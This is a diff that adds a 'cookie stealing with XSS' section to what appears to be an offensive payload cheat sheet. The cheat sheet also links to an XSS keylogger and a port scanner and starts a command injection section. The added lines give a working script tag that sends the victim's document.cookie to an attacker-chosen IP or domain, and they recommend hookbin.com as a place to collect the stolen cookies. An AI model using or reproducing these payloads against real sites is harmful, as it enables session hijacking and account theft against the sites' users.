@@ -122,6 +122,12 @@ document.write
 * XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)
 * Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner
 
+### COOKIE STEALING WITH XSS
+> to steal a cookie a location to recieve the results is required, local ip or hookbin.com works well
+```javascript
+<script>var i=new Image;i.src="http://[IP OR DOMAIN : PORT]/?"+document.cookie;</script>
+```
+
 ## COMMAND INJECTION PAYLOADS
 ### Linux
 ```bash
